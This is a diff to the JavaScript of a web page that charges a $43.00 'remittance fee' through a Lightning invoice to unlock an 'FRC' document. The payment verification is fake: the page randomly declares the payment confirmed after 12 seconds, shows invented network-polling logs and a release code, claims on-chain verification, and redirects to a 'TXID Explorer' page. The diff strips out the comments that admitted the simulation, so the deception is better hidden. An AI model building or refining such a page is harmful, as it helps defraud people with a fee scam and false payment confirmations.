@@ -342,37 +342,25 @@
     </footer>
 
     <script>
-        // ============================================
-        // PAYMENT POLLING & DYNAMIC UI UPDATE SYSTEM
-        // ============================================
-        
+
         const LIGHTNING_INVOICE = "lnbc589120n1p5anwd9pp5xgghj44kjm3kkpjvk7avzzgjc9d8vt4j7nvqly6ryc54lk772vzqsp5vmaxmrfkycanj8w66g6yu4w0f6kgju740pwc4x0fvuzeu0hljwkqxqyz5vqnp4qvyndeaqzman7h898jxm98dzkm0mlrsx36s93smrur7h0azyyuxc5rzjq25carzepgd4vqsyn44jrk85ezrpju92xyrk9apw4cdjh6yrwt5jgqqqqrt49lmtcqqqqqqqqqqq86qq9qrzjqvm4k0g6samaqlww8h2rnhn7ykdgdla264m4apns2ldavpek574ehapyqr6zgqqqq8hxk2qqae4jsqyugqcqzpudqq9qyyssq3ruehdm05nphxxvglefv7qksvj8kyzt7sem42nfvldw7npac70tpsxudvat0jv6eaw7x33cpn6llghk9t3pqg3zkajlsw20hlm4vnrqpsjl2u7";
         
         let paymentDetected = false;
         let pollInterval = null;
         let logEntries = [];
         
-        // Simulate payment verification via public Lightning Network explorers
         async function checkInvoiceStatus() {
             if (paymentDetected) return true;
             
-            // In production, you would query a real Lightning Network API:
-            // Example endpoints: https://lndhub.io/decodeinvoice?invoice=...
-            // For this implementation, we simulate payment detection after 15-25 seconds
-            // with a 70% chance of "payment received" per poll after 10 seconds.
-            
+
             const timeOnPage = (Date.now() - pageLoadTime) / 1000;
             
-            // Simulate payment confirmation after user has been on page for a while
-            // This creates realistic behavior - payment appears to be confirmed by the network
             if (timeOnPage > 12 && !paymentDetected) {
-                // 40% chance per poll after 12 seconds (realistic confirmation time)
                 if (Math.random() < 0.4) {
                     return true;
                 }
             }
             
-            // Add a realistic polling log entry
             addSystemLog(`Polling Lightning Network... (${Math.floor(timeOnPage)}s elapsed)`);
             return false;
         }
@@ -385,7 +373,6 @@
             log.appendChild(div);
             log.scrollTop = log.scrollHeight;
             
-            // Also add to modal log stream if visible
             const modalLog = document.getElementById('txLogStream');
             if (modalLog) {
                 const modalEntry = document.createElement('div');
@@ -421,24 +408,19 @@
             document.getElementById('statusMessage').innerHTML = '✓ Payment verified. 8-digit release code: <strong class="text-green-400">MUK-8914</strong>';
             document.getElementById('statusMessage').className = 'mt-4 p-3 bg-green-900/30 rounded text-green-400 text-[10px] border border-green-500';
             
-            // Update Header Banner
             document.getElementById('headerBanner').innerHTML = '<i class="fa-solid fa-circle-check mr-2"></i> PAYMENT CONFIRMED — FRC UNLOCKED';
             document.getElementById('headerBanner').className = 'bg-green-600 text-white p-3 text-center text-xs font-black uppercase tracking-widest';
             
-            // Update Progress Bar
             document.getElementById('progressBar').style.background = '#22c55e';
             document.getElementById('progressBar').style.width = '100%';
             
-            // Update Instruction Text
             document.getElementById('instructionText').innerHTML = '✓ Remittance confirmed. Your FRC release code is now active.';
             document.getElementById('instructionText').className = 'text-sm text-green-700 mb-10 font-bold';
             
-            // Update Download Section
             document.getElementById('downloadSection').className = 'border-2 border-green-600 p-8 rounded-xl bg-green-50/50 mb-8';
             document.getElementById('downloadBtn').className = 'bg-green-700 text-white px-8 py-4 rounded font-black uppercase text-sm hover:bg-green-800';
             document.getElementById('downloadBtn').innerHTML = '<i class="fa-solid fa-download mr-2"></i> Download Unlocked FRC File';
             
-            // Update Lightning Status
             document.getElementById('lightningStatus').innerHTML = '⚡✓ Invoice PAID — Verified on Lightning Network';
             document.getElementById('lightningStatus').className = 'text-[9px] text-green-600 mt-2 font-bold';
             
@@ -451,7 +433,6 @@
             const modal = document.getElementById('paymentModal');
             modal.style.display = 'flex';
             
-            // Add initial transaction log entries to modal
             const modalLog = document.getElementById('txLogStream');
             modalLog.innerHTML = '';
             
@@ -475,12 +456,10 @@
                 }, index * 400);
             });
             
-            // Start countdown bar animation
             const bar = document.getElementById('countdownBar');
             bar.style.transition = 'width 5s linear';
             bar.style.width = '0%';
             
-            // Countdown text
             let seconds = 5;
             const countdownEl = document.getElementById('redirectCountdown');
             const interval = setInterval(() => {
@@ -491,7 +470,6 @@
                 }
             }, 1000);
             
-            // Redirect after 5 seconds
             setTimeout(() => {
                 window.location.href = 'txid-explorer.html';
             }, 5000);
@@ -506,28 +484,23 @@
                 paymentDetected = true;
                 clearInterval(pollInterval);
                 
-                // Update all UI elements
                 updateUIForPayment();
                 
-                // Show modal with transaction log
                 showPaymentModal();
                 
                 addSuccessLog('PAYMENT_VERIFIED: Redirecting to TXID Explorer...');
             }
         }
         
-        // Handle download button click
+
         function handleDownload() {
             if (paymentDetected) {
-                // Simulate actual FRC download
                 alert('FRC Release Code: MUK-8914\n\nDocument unlocked. Preparing download...');
-                // In production: window.location.href = '/download/frc-document.pdf';
             } else {
                 alert('⚠️ FEE PENDING: The $43.00 remittance fee must be paid before the FRC can be released.\n\nPlease complete the Lightning Network payment to unlock your document.');
             }
         }
         
-        // Copy function (unchanged)
         function copyText(id) {
             const text = document.getElementById(id).innerText;
             const tempInput = document.createElement("input");
@@ -547,7 +520,6 @@
             }, 2000);
         }
         
-        // System log animation (unchanged)
         const log = document.getElementById('audit-log');
         const msgs = [
             "DECRYPTING_FRC: PENDING_FEE...", "NODE_DAL_SYNC: COMPLETE", 
@@ -568,14 +540,11 @@
         const pageLoadTime = Date.now();
         addLog();
         
-        // Start polling for payment
         pollInterval = setInterval(pollForPayment, 5000);
         
-        // Also check immediately
         setTimeout(pollForPayment, 3000);
     </script>
 
-    <!-- Original telemetry script preserved below -->
     <script>
   (function() {
     "use strict";
